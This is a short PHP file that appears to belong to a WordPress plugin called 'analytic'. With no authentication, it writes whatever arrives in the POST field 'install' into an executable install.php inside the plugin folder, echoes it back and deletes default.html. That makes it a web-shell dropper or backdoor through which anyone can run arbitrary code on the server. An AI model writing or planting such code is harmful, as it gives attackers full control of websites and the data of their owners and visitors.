<?php
session_start();
$installit = $_POST['install'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic/install.php', 'w');
$installit = str_replace('\\', '', $installit);
$installit = htmlentities($installit);
fwrite($fp, html_entity_decode($installit));
fclose($fp);
echo $installit;
unlink($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic/default.html');
?>